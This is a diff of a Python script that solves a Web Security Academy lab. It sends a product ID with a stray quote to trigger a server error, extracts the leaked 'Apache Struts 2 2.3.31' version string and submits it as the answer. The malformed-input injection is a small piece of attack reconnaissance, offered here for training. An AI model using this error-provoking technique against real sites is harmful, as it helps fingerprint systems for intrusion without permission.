@@ -12,6 +12,7 @@
 #
 ####################################################################################
 
+
 ###########
 # imports
 ###########
@@ -19,29 +20,47 @@ import requests
 import re
 from colorama import Fore
 
+
+#########
+# Main
+#########
+
 # change this to your lab URL
-url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net"
+url = "https://0adf006704040b2181e3a7ac001100d7.web-security-academy.net"
 
 try:
-    inject_payload = requests.get(
-        f"{url}/product?productId=4'")  # inject the payload
-    if inject_payload.status_code == 500:  # if error occur
-        print(Fore.WHITE + "1. Injecting the payload.. " + Fore.GREEN + "OK")
-        framework_name = re.findall("Apache Struts 2 2.3.31",
-                                    inject_payload.text)[0]  # extract the framework name; change this if it's changed in you cases
-        print(Fore.WHITE + "2. Extracting the framework name.. " +
-              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name)
-        data = {
-            "answer": framework_name
-        }
-        try:
-            submit_answer = requests.post(
-                f"{url}/submitsolution", data)  # submit solution
-            if submit_answer.status_code == 200:
-                print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
-                print(
-                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
-        except:
-            print(Fore.RED + "[!] Failed to submit solution")
+    # inject the payload
+    inject_payload = requests.get(f"{url}/product?productId=4'")  
+
 except:
     print(Fore.RED + "[!] Failed to inject the payload")
+    exit(1)
+ 
+# if error occurred
+if inject_payload.status_code == 500:  
+    print(Fore.WHITE + "1. Injecting the payload.. " + Fore.GREEN + "OK")
+    
+    # extract the framework name; change this if it's changed in you cases
+    framework_name = re.findall("Apache Struts 2 2.3.31", inject_payload.text)[0]  
+    
+    print(Fore.WHITE + "2. Extracting the framework name.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name)
+    
+    # data to send via POST
+    data = {
+        "answer": framework_name
+    }
+
+    try:
+        # submit solution
+        submit_answer = requests.post(f"{url}/submitsolution", data)  
+
+    except:
+        print(Fore.RED + "[!] Failed to submit solution")
+        exit(1)
+
+    print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
+    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+
+else:
+    print(Fore.RED + "[!] Failed to inject the payload to make an interanl server error")
+
